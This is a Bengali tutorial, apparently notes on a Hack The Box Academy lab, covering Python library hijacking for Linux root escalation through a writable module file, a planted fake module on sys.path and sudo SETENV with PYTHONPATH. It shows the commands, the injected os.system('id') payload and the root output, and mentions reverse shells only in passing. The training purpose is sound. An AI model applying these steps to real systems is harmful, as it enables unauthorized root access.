# Python Library Hijacking - [LINK](https://academy.hackthebox.com/app/module/51/section/1640)


আইটি ইন্ডাস্ট্রিতে পাইথন (Python) বর্তমানে বিশ্বের সবচেয়ে জনপ্রিয় এবং বহুল ব্যবহৃত প্রোগ্রামিং ভাষাগুলোর একটি। পাইথনের এত জনপ্রিয়তার অন্যতম প্রধান কারণ হলো এর বিশাল লাইব্রেরি (Library) কালেকশন।

ডেটা প্রসেসিং, ম্যাথমেটিক্যাল অ্যানালাইসিস থেকে শুরু করে প্রায় সব কাজের জন্যই পাইথনে তৈরি করা লাইব্রেরি রয়েছে (যেমন: NumPy, Pandas)। পাইথনের একটি স্ট্যান্ডার্ড লাইব্রেরিও রয়েছে যা ডিফল্টভাবে ইনস্টল থাকে। প্রোগ্রামের স্পিড ঠিক রাখার জন্য পাইথন সব লাইব্রেরি একসাথে লোড করে না, বরং কোড লেখার সময় আমাদের প্রয়োজন অনুযায়ী মডিউলগুলো ইম্পোর্ট (Import) করে নিতে হয়।

পাইথনে মডিউল ইম্পোর্ট করার তিনটি সাধারণ পদ্ধতি নিচে দেওয়া হলো:

```python
#!/usr/bin/env python3

# পদ্ধতি ১ - মডিউল ইম্পোর্ট
import pandas

# পদ্ধতি ২ - ওয়াইল্ডকার্ড ইম্পোর্ট (সবকিছু ইম্পোর্ট করা)
from pandas import *

# পদ্ধতি ৩ - নির্দিষ্ট নাম ধরে ইম্পোর্ট
from pandas import Series

```

**হাইজ্যাকিং কী?**
পাইথন স্ক্রিপ্টগুলো যখন কোনো লাইব্রেরি ইম্পোর্ট করে, তখন যদি আমরা সেই লাইব্রেরির ভেতর আমাদের নিজস্ব ম্যালিশিয়াস (ক্ষতিকর) কোড ঢুকিয়ে দিতে পারি, তবে তাকে পাইথন লাইব্রেরি হাইজ্যাকিং বলে। স্ক্রিপ্টটি রান করার সময় আমাদের কোডটিও রান হয়ে যাবে।

লাইব্রেরি হাইজ্যাক করার মূলত তিনটি পদ্ধতি বা ভেক্টর রয়েছে:
১. Insecure Write Permissions (অনিরাপদ রাইট পারমিশন)
২. Python Library Search Path (পাইথন লাইব্রেরি সার্চ পাথ)
৩. PYTHONPATH Environment Variable (PYTHONPATH এনভায়রনমেন্ট ভ্যারিয়েবল)

চলুন প্রতিটি পদ্ধতি খুব সহজে ধাপে ধাপে বুঝে নিই।

## ১. Insecure Write Permissions (অনিরাপদ রাইট পারমিশন)

ধরে নিন, আমরা একটি কোম্পানির ভেতরের নেটওয়ার্কে একজন ডেভেলপারের মেশিনে অ্যাক্সেস পেয়েছি। ডেভলপাররা অনেক সময় কাজের সুবিধার জন্য বিভিন্ন মডিউল বা লাইব্রেরির পারমিশন সবার জন্য "Writeable" (এডিট করার পারমিশন) করে রাখেন, যা একটি বড় ভুল।

যদি কোনো পাইথন মডিউলে আমাদের রাইট পারমিশন থাকে এবং আমরা এমন কোনো স্ক্রিপ্ট পাই যা ওই মডিউলটি ব্যবহার করে এবং স্ক্রিপ্টটি `sudo` (রুট পারমিশন) দিয়ে রান করা যায়, তবে আমরা খুব সহজেই রুট অ্যাক্সেস পেতে পারি।

**ধাপ ১: Sudo পারমিশন চেক করা**
প্রথমে `sudo -l` কমান্ড দিয়ে চেক করব আমাদের ইউজারের কী কী পারমিশন আছে।

```text
htb-student@lpenix:~$ sudo -l

Matching Defaults entries for htb-student on lpenix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on lpenix:
    (ALL) NOPASSWD: /usr/bin/python3 /home/htb-student/mem_status.py

```

এখানে আমরা দেখতে পাচ্ছি যে, `htb-student` ইউজার কোনো পাসওয়ার্ড ছাড়াই রুট (root) হিসেবে `mem_status.py` স্ক্রিপ্টটি রান করতে পারবে।

**ধাপ ২: স্ক্রিপ্টের পারমিশন এবং কন্টেন্ট দেখা**

```bash
htb-student@lpenix:~$ ls -l mem_status.py
-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py

```

স্ক্রিপ্টটিতে SUID বিট (s) সেট করা আছে এবং এর মালিক রুট। কিন্তু লিনাক্স সিকিউরিটির কারণে পাইথন বা ব্যাশ স্ক্রিপ্টের SUID বিট ইগনোর করে। তাই রুট হওয়ার জন্য আমাদের `sudo` এর ওপরই নির্ভর করতে হবে। স্ক্রিপ্টটি আমরা এডিট করতে পারব না (রাইট পারমিশন নেই), তাই চলুন দেখি এর ভেতর কী লেখা আছে:

```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")

```

স্ক্রিপ্টটি `psutil` নামের একটি মডিউল ইম্পোর্ট করছে এবং তার ভেতরের `virtual_memory()` ফাংশনটি ব্যবহার করছে।

**ধাপ ৩: মডিউলের পারমিশন চেক করা**
এবার আমরা খুঁজব `psutil` মডিউলটি কোথায় আছে এবং সেখানে আমাদের রাইট পারমিশন আছে কিনা।

```bash
htb-student@lpenix:~$ grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*

```

সার্চ করার পর আমরা দেখলাম ফাংশনটি `/usr/local/lib/python3.8/dist-packages/psutil/__init__.py` ফাইলে আছে। এবার এর পারমিশন চেক করি:

```bash
htb-student@lpenix:~$ ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py

```

খেয়াল করুন ফাইলের শেষে `rw-` লেখা আছে। এর মানে হলো বিশ্বের যে কেউ (Others) ফাইলটি এডিট করতে পারবে!

**ধাপ ৪: মডিউল হাইজ্যাক করা (Exploitation)**
যেহেতু আমরা ফাইলটি এডিট করতে পারি, তাই আমরা ফাইলের ভেতর `virtual_memory()` ফাংশনটি খুঁজে বের করে তার একদম শুরুতে আমাদের নিজেদের কোড বসিয়ে দেব।

```python
...SNIP...

def virtual_memory():

    ...SNIP...
    #### Hijacking (আমাদের ইনজেক্ট করা কোড)
    import os
    os.system('id')
    

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    # cached for later use in Process.memory_percent()
    _TOTAL_PHYMEM = ret.total
    return ret

...SNIP...

```

**ধাপ ৫: প্রিভিলেজ এসকালেশন**
এবার আমরা স্ক্রিপ্টটি `sudo` দিয়ে রান করব।

```bash
htb-student@lpenix:~$ sudo /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%

```

বুম! আমাদের ইনজেক্ট করা `os.system('id')` কোডটি রুট হিসেবে রান হয়েছে এবং আমরা `uid=0(root)` দেখতে পাচ্ছি। এখন আমরা চাইলে সেখানে রিভার্স শেল (Reverse Shell) কোড বসিয়ে পুরো সিস্টেমের রুট অ্যাক্সেস নিয়ে নিতে পারি।

## ২. Python Library Search Path (পাইথন লাইব্রেরি সার্চ পাথ)

পাইথন যখন কোনো মডিউল ইম্পোর্ট করে, তখন সে যত্রতত্র খোঁজে না। সে একটি নির্দিষ্ট লিস্ট বা "প্রায়োরিটি" অনুযায়ী বিভিন্ন ফোল্ডারে খোঁজে। লিস্টের ওপরের দিকের ফোল্ডারগুলোতে সে আগে খোঁজে। এই লিস্টটি দেখার কমান্ড হলো:

```bash
htb-student@lpenix:~$ python3 -c 'import sys; print("\n".join(sys.path))'

/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages

```

**অ্যাটাকের শর্ত:**
১. স্ক্রিপ্টটি যে মডিউলটি খুঁজছে, তা লিস্টের নিচের দিকের কোনো ফোল্ডারে আছে।
২. লিস্টের ওপরের দিকের কোনো ফোল্ডারে আমাদের রাইট (Write) পারমিশন আছে।

যদি এই দুটি শর্ত মেলে, তবে আমরা ওপরের দিকের ফোল্ডারটিতে আসল মডিউলের নামে একটি নকল (Fake) মডিউল বানিয়ে রাখতে পারি। পাইথন যখন মডিউল খুঁজবে, তখন সে ওপরের ফোল্ডারে আমাদের নকল মডিউলটি পেয়ে যাবে এবং আসলটি লোড না করেই আমাদের ম্যালিশিয়াস কোডটি লোড করে ফেলবে!

**ধাপ ১: আসল মডিউলের লোকেশন চেক করা**

```bash
htb-student@lpenix:~$ pip3 show psutil
Location: /usr/local/lib/python3.8/dist-packages

```

`psutil` মডিউলটি চার নম্বর লিস্টে আছে।

**ধাপ ২: ফোল্ডার পারমিশন চেক করা**
আমরা ওপরের ফোল্ডারগুলোর পারমিশন চেক করে দেখলাম `/usr/lib/python3.8` ফোল্ডারটিতে সবার রাইট পারমিশন আছে:

```bash
htb-student@lpenix:~$ ls -la /usr/lib/python3.8
total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .

```

**ধাপ ৩: নকল মডিউল তৈরি (psutil.py)**
এবার আমরা ওই ফোল্ডারে `psutil.py` নামে একটি ফাইল তৈরি করব এবং আসল ফাংশনটির নাম (`virtual_memory`) ঠিক রেখে আমাদের কোড বসিয়ে দেব:

```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')

```

**ধাপ ৪: প্রিভিলেজ এসকালেশন**
এবার `sudo` দিয়ে মেইন স্ক্রিপ্টটি রান করি:

```bash
htb-student@lpenix:~$ sudo /usr/bin/python3 mem_status.py

uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available' 

```

খেয়াল করুন, আমাদের `uid=0(root)` রান হয়েছে! নিচে একটি এরর এসেছে কারণ আমাদের ফাংশনটি মেইন স্ক্রিপ্টকে কোনো ডেটা রিটার্ন করেনি, কিন্তু তার আগেই আমাদের হ্যাকিং কোড সফলভাবে রুট হিসেবে রান হয়ে গেছে।

## ৩. PYTHONPATH Environment Variable (PYTHONPATH এনভায়রনমেন্ট ভ্যারিয়েবল)

`PYTHONPATH` হলো লিনাক্সের একটি এনভায়রনমেন্ট ভ্যারিয়েবল, যা পাইথনকে বলে দেয় মডিউল ইম্পোর্ট করার সময় কোন ডিরেক্টরিগুলোতে সবার আগে খুঁজতে হবে। যদি কোনো ইউজার `sudo` কমান্ড চালানোর সময় এই ভ্যারিয়েবলটি নিজের মতো সেট করতে পারে, তবে সে পাইথনের সার্চ ইঞ্জিনকে বোকা বানিয়ে যেকোনো জায়গা থেকে মডিউল লোড করাতে পারবে।

**ধাপ ১: Sudo পারমিশন চেক করা**

```bash
htb-student@lpenix:~$ sudo -l 

Matching Defaults entries for htb-student on ACADEMY-LPENIX:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on ACADEMY-LPENIX:
    (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3

```

এখানে সবচেয়ে গুরুত্বপূর্ণ অংশটি হলো **`SETENV:`**। এর মানে হলো, আমরা `sudo` দিয়ে কমান্ড চালানোর সময় এনভায়রনমেন্ট ভ্যারিয়েবল পরিবর্তন করার ক্ষমতা রাখি।

**ধাপ ২: প্রিভিলেজ এসকালেশন (Exploitation)**
আগের পদ্ধতিতে বানানো আমাদের ম্যালিশিয়াস `psutil.py` ফাইলটি আমরা `/tmp` ফোল্ডারে রাখলাম।

এবার আমরা কমান্ড লাইনেই `PYTHONPATH` কে `/tmp/` সেট করে স্ক্রিপ্টটি রান করব:

```bash
htb-student@lpenix:~$ sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py

uid=0(root) gid=0(root) groups=0(root)
...SNIP...

```

কমান্ডটি দেওয়ার সাথে সাথেই পাইথন সবার আগে `/tmp/` ফোল্ডারে `psutil` কে খুঁজবে, আমাদের নকল ফাইলটি পাবে এবং রুট পারমিশন নিয়ে সেটি রান করে ফেলবে।

এই তিনটি পদ্ধতির মাধ্যমেই আমরা ভুল কনফিগার করা পাইথন স্ক্রিপ্ট থেকে খুব সহজেই লিনাক্স সিস্টেমে রুট (root) অ্যাক্সেস নিতে পারি।
